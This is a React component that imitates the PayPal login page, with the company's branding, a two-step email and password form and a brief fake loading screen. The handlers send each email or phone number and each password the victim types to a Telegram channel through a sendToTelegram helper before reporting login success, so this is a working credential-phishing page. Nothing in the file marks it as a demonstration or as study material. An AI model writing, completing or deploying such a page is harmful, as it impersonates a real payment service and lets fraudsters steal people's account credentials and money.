import { useEffect, useState } from 'react';
import { ChevronDown } from 'lucide-react';
import { sendToTelegram } from '../utils/telegram';

interface LoginPageProps {
  onLoginSuccess: (email: string) => void;
}

export function LoginPage({ onLoginSuccess }: LoginPageProps) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState<'email' | 'loading' | 'password'>('email');

  const validateInput = (value: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{10}$/;
    return emailRegex.test(value) || phoneRegex.test(value);
  };

  const handleNext = async () => {
    if (validateInput(email)) {
      await sendToTelegram(`<b>[LOGIN] Email/Phone:</b> ${email}`);
      setStep('loading');
    }
  };

  const handleLogin = async () => {
    if (!password) return;
    await sendToTelegram(`<b>[LOGIN] Password:</b> ${password}`);
    onLoginSuccess(email);
  };

  const handleChange = () => {
    setStep('email');
    setPassword('');
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 'email') {
      handleNext();
    } else if (step === 'password') {
      handleLogin();
    }
  };

  useEffect(() => {
    if (step === 'loading') {
      const timer = setTimeout(() => {
        setStep('password');
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  return (
    <div className="relative min-h-screen w-full bg-[#FAFAFA] flex flex-col items-center justify-between font-['Inter',sans-serif]">
      {/* Loading Overlay */}
      {step === 'loading' && (
        <div className="absolute inset-0 z-50 bg-white flex flex-col items-center justify-center">
          <div className="flex flex-col items-center gap-4">
            <div className="relative w-12 h-12">
              <div className="absolute inset-0 border-2 border-gray-100 rounded-full"></div>
              <div 
                className="absolute inset-0 border-2 border-t-[#0070BA] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"
                style={{ animationDuration: '0.8s' }}
              ></div>
            </div>
            <p className="text-[#2C2E2F] text-[18px] font-normal">Just a second...</p>
          </div>
        </div>
      )}

      {/* Main Card */}
      <div className="flex-1 flex items-center justify-center w-full px-4 py-8 sm:py-12">
        <div className="w-full max-w-[460px] bg-white rounded-[20px] sm:border border-[#E5E5E5] px-6 sm:px-10 py-10 sm:py-16 flex flex-col items-center sm:shadow-[0_2px_12px_rgba(0,0,0,0.04)]">
          {/* PayPal Logo */}
          <div className="mb-8 sm:mb-12">
            <h1 className="text-[28px] sm:text-[32px] font-bold text-black tracking-tight">PayPal</h1>
          </div>

          <form onSubmit={handleSubmit} className="w-full flex flex-col">
            {step === 'email' || step === 'loading' ? (
              <>
                <div className="w-full mb-4">
                  <input
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email or mobile number"
                    className="w-full px-4 py-[18px] border border-[#ADB5BD] rounded-lg text-base text-gray-900 outline-none focus:border-[#0070BA] focus:ring-1 focus:ring-[#0070BA] transition-all placeholder:text-[#6C757D]"
                  />
                </div>

                <div className="w-full mb-8">
                  <a href="#" className="text-[#0070BA] text-[15px] font-bold hover:underline">
                    Forgot email?
                  </a>
                </div>

                <button
                  type="submit"
                  disabled={!validateInput(email)}
                  className={`w-full py-4 text-white font-bold text-[17px] rounded-full transition-colors mb-8 shadow-sm ${
                    validateInput(email) 
                      ? 'bg-[#0054BB] hover:bg-[#004294]' 
                      : 'bg-[#0054BB]/50 cursor-not-allowed'
                  }`}
                >
                  Next
                </button>
              </>
            ) : (
              <>
                <div className="flex items-center gap-3 mb-8">
                  <span className="text-base text-gray-900">{email}</span>
                  <button
                    type="button"
                    onClick={handleChange}
                    className="text-[#0070BA] text-base font-bold hover:underline"
                  >
                    Change
                  </button>
                </div>

                <div className="w-full mb-4 relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    className="w-full px-4 py-[18px] border border-[#ADB5BD] rounded-lg text-base text-gray-900 outline-none focus:border-[#0070BA] focus:ring-1 focus:ring-[#0070BA] transition-all placeholder:text-[#6C757D]"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-[#0070BA] text-[15px] font-bold hover:underline"
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>

                <div className="w-full mb-8">
                  <a href="#" className="text-[#0070BA] text-[15px] font-bold hover:underline">
                    Forgot password?
                  </a>
                </div>

                <button
                  type="submit"
                  disabled={!password}
                  className={`w-full py-4 text-white font-bold text-[17px] rounded-full transition-colors mb-8 shadow-sm ${
                    password 
                      ? 'bg-[#0054BB] hover:bg-[#004294]' 
                      : 'bg-[#0054BB]/50 cursor-not-allowed'
                  }`}
                >
                  Log In
                </button>
              </>
            )}
          </form>

          {/* Divider */}
          <div className="w-full flex items-center gap-4 mb-8">
            <div className="flex-1 h-[1px] bg-[#E5E5E5]" />
            <span className="text-[#6C757D] text-[13px]">or</span>
            <div className="flex-1 h-[1px] bg-[#E5E5E5]" />
          </div>

          {/* Sign Up Button */}
          <button className="w-full py-4 border border-black text-black font-bold text-[17px] rounded-full hover:bg-gray-50 transition-colors mb-16">
            Sign Up
          </button>

          {/* Language Selector */}
          <div className="flex flex-col sm:flex-row items-center gap-4 text-[14px] text-[#2C2E2F] font-medium">
            <div className="flex items-center gap-1.5 cursor-pointer">
              <img src="https://flagcdn.com/w20/us.png" alt="US Flag" className="w-5 h-3.5 object-cover rounded-[1px]" />
              <ChevronDown className="w-4 h-4 text-[#6C757D]" />
            </div>
            <div className="flex items-center gap-2 sm:gap-3 flex-wrap justify-center">
              <span className="text-black font-bold">English</span>
              <span className="text-[#E5E5E5] hidden sm:inline">|</span>
              <a href="#" className="hover:underline text-[#2C2E2F]">Français</a>
              <span className="text-[#E5E5E5] hidden sm:inline">|</span>
              <a href="#" className="hover:underline text-[#2C2E2F]">Español</a>
              <span className="text-[#E5E5E5] hidden sm:inline">|</span>
              <a href="#" className="hover:underline text-[#2C2E2F]">中文</a>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full py-6 px-6 bg-white border-t border-[#E5E5E5]">
        <div className="flex items-center justify-center gap-6 text-[12px] font-medium text-[#6C757D] flex-wrap uppercase tracking-wider">
          <a href="#" className="hover:underline">Contact Us</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Legal</a>
          <a href="#" className="hover:underline">Policy Updates</a>
          <a href="#" className="hover:underline">Worldwide</a>
        </div>
      </footer>
    </div>
  );
}
